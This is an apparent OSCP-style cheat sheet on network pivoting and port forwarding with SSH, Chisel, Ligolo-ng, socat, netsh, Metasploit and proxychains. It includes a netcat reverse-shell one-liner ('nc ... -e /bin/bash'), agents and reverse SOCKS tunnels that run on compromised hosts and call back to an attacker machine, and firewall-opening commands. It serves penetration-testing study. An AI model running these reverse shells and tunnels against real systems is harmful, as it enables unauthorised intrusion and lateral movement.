# Pivoting & Port Forwarding Guide

**Author:** r0tn3x  
**Last Updated:** December 15, 2025

---

## 📋 Table of Contents

1. [SSH Tunneling](#ssh-tunneling)
2. [Chisel](#chisel)
3. [Ligolo-ng](#ligolo-ng)
4. [Socat](#socat)
5. [Netsh (Windows)](#netsh-windows)
6. [Metasploit Pivoting](#metasploit-pivoting)
7. [Proxychains](#proxychains)

---

## 🔐 SSH Tunneling

### Local Port Forwarding

**Forward local port to remote service:**
```bash
ssh -L <local_port>:<target_ip>:<target_port> user@pivot_host

# Example: Access 192.168.1.100:3306 through SSH server
ssh -L 3306:192.168.1.100:3306 user@10.10.10.10

# Access: mysql -h 127.0.0.1 -P 3306
```

### Remote Port Forwarding

**Forward remote port back to local machine:**
```bash
ssh -R <remote_port>:<local_ip>:<local_port> user@pivot_host

# Example: Reverse shell listener
ssh -R 4444:127.0.0.1:4444 user@10.10.10.10
```

### Dynamic Port Forwarding (SOCKS Proxy)

**Create SOCKS proxy:**
```bash
ssh -D 1080 user@pivot_host

# Configure proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# Use with tools
proxychains nmap -sT -Pn 192.168.1.100
proxychains firefox
```

### SSH Tunneling Tips

```bash
# Background SSH tunnel
ssh -f -N -D 1080 user@pivot_host

# SSH with key
ssh -i id_rsa -D 1080 user@pivot_host

# Keep alive
ssh -o ServerAliveInterval=60 -D 1080 user@pivot_host
```

---

## 🔧 Chisel

**Modern fast TCP/UDP tunnel over HTTP secured via SSH**

### Setup

**Start Chisel server on attacker machine:**
```bash
./chisel server -p 8000 --reverse
```

**Windows client (on compromised host):**
```powershell
.\chisel.exe client <attacker_ip>:8000 R:socks
```

**Linux client:**
```bash
./chisel client <attacker_ip>:8000 R:socks
```

### Port Forwarding with Chisel

**Reverse port forward (remote to local):**
```bash
# Server
./chisel server -p 8000 --reverse

# Client
./chisel client <attacker_ip>:8000 R:3389:192.168.1.100:3389
```

**Local port forward:**
```bash
# Server
./chisel server -p 8000

# Client
./chisel client <attacker_ip>:8000 3306:192.168.1.100:3306
```

### Chisel with Proxychains

```bash
# Configure proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# Use with tools
proxychains nmap -sT -Pn 192.168.1.0/24
proxychains evil-winrm -i 192.168.1.100 -u admin -p password
```

---

## ⚡ Ligolo-ng

**Modern, simple, and efficient tunneling tool**

### Setup

**1. Start Ligolo proxy on attacker:**
```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

./proxy -selfcert
```

**2. Upload agent to target and run:**
```bash
# Linux
./agent -connect <attacker_ip>:11601 -ignore-cert

# Windows
.\agent.exe -connect <attacker_ip>:11601 -ignore-cert
```

**3. In ligolo proxy session:**
```
ligolo-ng » session
[0] 10.10.10.100 - DESKTOP-PC\user - windows/amd64
ligolo-ng » use 0
ligolo-ng » start
```

**4. Add route on attacker:**
```bash
sudo ip route add 192.168.1.0/24 dev ligolo
```

**5. Access internal network directly:**
```bash
nmap 192.168.1.100
evil-winrm -i 192.168.1.100 -u admin -p password
```

### Ligolo Port Forwarding

```
ligolo-ng » listener_add --addr 0.0.0.0:3389 --to 192.168.1.100:3389
```

---

## 🔌 Socat

**Relay/port forward tool**

### Basic Port Forward

```bash
# Forward local 8080 to remote 80
socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80
```

### Reverse Shell Relay

**On pivot host:**
```bash
socat TCP-LISTEN:4444,fork TCP:<attacker_ip>:5555
```

**Attacker listener:**
```bash
nc -lvnp 5555
```

**Target connects to pivot:**
```bash
nc <pivot_ip> 4444 -e /bin/bash
```

### File Transfer via Socat

**Receiver:**
```bash
socat TCP-LISTEN:8000,fork file:received_file
```

**Sender:**
```bash
socat file:file_to_send TCP:192.168.1.100:8000
```

---

## 🪟 Netsh (Windows)

### Port Forwarding

**Forward port (requires admin):**
```cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.1.100

# View rules
netsh interface portproxy show all

# Delete rule
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
```

### Firewall Rules

```cmd
# Add firewall rule
netsh advfirewall firewall add rule name="Port Forward 8080" dir=in action=allow protocol=TCP localport=8080
```

---

## 🎯 Metasploit Pivoting

### Add Route

```
meterpreter > run autoroute -s 192.168.1.0/24
meterpreter > run autoroute -p
```

### SOCKS Proxy

```
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) > set VERSION 5
msf6 auxiliary(server/socks_proxy) > run -j
```

### Port Forward

```
meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.1.100
meterpreter > portfwd list
```

---

## 🔗 Proxychains

### Configuration

**Edit `/etc/proxychains4.conf`:**
```
# Dynamic chain (tries proxies in order)
dynamic_chain

# Proxy DNS requests
proxy_dns

# Proxy list
[ProxyList]
socks5 127.0.0.1 1080
```

### Usage

```bash
# Scan through proxy
proxychains nmap -sT -Pn 192.168.1.100

# Evil-WinRM through proxy
proxychains evil-winrm -i 192.168.1.100 -u admin -p password

# Browse web
proxychains firefox

# Metasploit
proxychains msfconsole
```

---

## 🛠️ Pivoting Scenarios

### Scenario 1: Double Pivot

**Network topology:**
```
Attacker → Host A (10.10.10.10) → Host B (192.168.1.100) → Host C (172.16.1.100)
```

**Solution with Chisel:**

1. **First pivot (A):**
```bash
# On attacker
./chisel server -p 8000 --reverse

# On Host A
./chisel client <attacker_ip>:8000 R:9001:socks
```

2. **Second pivot (B through A):**
```bash
# Configure proxychains for first SOCKS
proxychains ssh -D 9002 user@192.168.1.100
```

3. **Access Host C:**
```bash
# Update proxychains to use 9002
proxychains nmap 172.16.1.100
```

### Scenario 2: Access RDP Through Pivot

```bash
# Forward RDP port
ssh -L 3389:192.168.1.100:3389 user@10.10.10.10

# Connect
xfreerdp /u:admin /p:password /v:127.0.0.1
```

### Scenario 3: Multi-Network Access

**Using ligolo-ng for clean access:**
```bash
# Add multiple routes
sudo ip route add 192.168.1.0/24 dev ligolo
sudo ip route add 172.16.1.0/24 dev ligolo

# Direct access to both networks
nmap 192.168.1.100
nmap 172.16.1.100
```

---

## 📊 Tool Comparison

| Tool | Speed | Ease of Use | Stability | Best For |
|------|-------|-------------|-----------|----------|
| **SSH** | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | Quick pivots, Linux |
| **Chisel** | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | Cross-platform, HTTP tunnel |
| **Ligolo-ng** | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | Modern, clean, efficient |
| **Socat** | ⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐⭐ | Simple port forwards |
| **Metasploit** | ⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐ | Already in Metasploit |

---

## 💡 Quick Reference

**SSH SOCKS Proxy:**
```bash
ssh -D 1080 user@pivot_host
```

**Chisel Reverse SOCKS:**
```bash
# Server: ./chisel server -p 8000 --reverse
# Client: ./chisel client <attacker>:8000 R:socks
```

**Ligolo-ng:**
```bash
# 1. ./proxy -selfcert
# 2. ./agent -connect <attacker>:11601 -ignore-cert
# 3. sudo ip route add <internal_network> dev ligolo
```

---

## 🎓 Tips & Best Practices

1. **Use ligolo-ng for OSCP** - Clean, stable, no proxychains needed
2. **Chisel for Windows** - Works great when SSH not available
3. **Test connectivity** - Always verify routes before exploitation
4. **Keep tunnels alive** - Use keep-alive settings
5. **Clean up** - Remove routes and tunnels after use

---

**Next Steps:** See [Cheat Sheet](cheatsheet.md) for exploitation techniques

**Author:** r0tn3x | OSCP+ December 2025
